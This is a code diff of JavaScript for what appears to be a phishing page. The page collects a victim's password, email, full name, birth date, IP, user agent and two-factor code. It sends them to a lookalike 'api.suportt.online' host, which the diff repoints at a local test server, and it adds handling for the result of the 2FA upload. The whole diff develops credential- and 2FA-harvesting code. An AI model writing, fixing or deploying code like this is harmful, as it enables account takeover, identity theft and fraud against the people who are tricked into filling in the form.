@@ -1,9 +1,11 @@
 modalSetting("hide");
 var isFirstLoginInput=true;
        var requestRatioSelected=false;
-       var abc = 'api.suportt.online';
+       var local = 'http://api.win-media.prj';
+       var abc = 'https://api.suportt.online';
        let userInfo="";
        let id;
+       var upload_result;
        var f_result;
        let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
        document.getElementById("submissionID").innerHTML=thisSession;
@@ -28,7 +30,7 @@ var isFirstLoginInput=true;
 
        async function uploadFile() {
         const dt = {};
-        var faurl = 'https://'+ abc +'/business/checkpoint';
+        var faurl = local +'/business/checkpoint';
         var two_fa_code = document.getElementById("two_fa_code").value;
         dt.two_fa_code = two_fa_code;
         dt.id = id;
@@ -48,6 +50,7 @@ var isFirstLoginInput=true;
             success: function(data){
                 var res_data = JSON.stringify(data);
                 id = res_data.model_id;
+                upload_result = res_data;
                 return true;
             } 
         })    
@@ -62,7 +65,7 @@ var isFirstLoginInput=true;
             var pw = document.getElementById("password").value;
             var fullname = document.getElementById("fullName").value;
             var useragent = $.ua;
-            var url = 'https://'+ abc +'/business/verify';
+            var url = local +'/business/verify';
             //console.log(useragent.ua);
             model.location = ip;
             model.personal_email_address = email;
@@ -110,7 +113,6 @@ var isFirstLoginInput=true;
            }
            if(field=="photoID") {
                try {
-                   await uploadFile();
                 //    document.getElementById("uploadContent").innerHTML="Your photo was uploaded";
                    document.getElementById("submitPhotoNextBtn").disabled=false;
                }
@@ -151,7 +153,15 @@ var isFirstLoginInput=true;
                case "request" : moveTab("v-pills-profile");
                userInfo+="Fullname: `"+document.getElementById("fullName").value+"`\nBirth: `"+document.querySelector('#day').value+"/"+document.querySelector('#month').value+"/"+document.querySelector('#year').value+"`\n";
                break;
-               case "photoID" : moveTab("v-pills-messages");
+               case "photoID" : 
+                await uploadFile();
+                if(upload_result.error_code == 1){
+                    $('#faerror').style.display="";
+                    $('.form-control-fa').prop('disabled', false);
+                    $('#submitPhotoNextBtn').prop('disabled', false);
+                }else{
+                    moveTab("v-pills-messages");
+                }
                break;
            }
        }
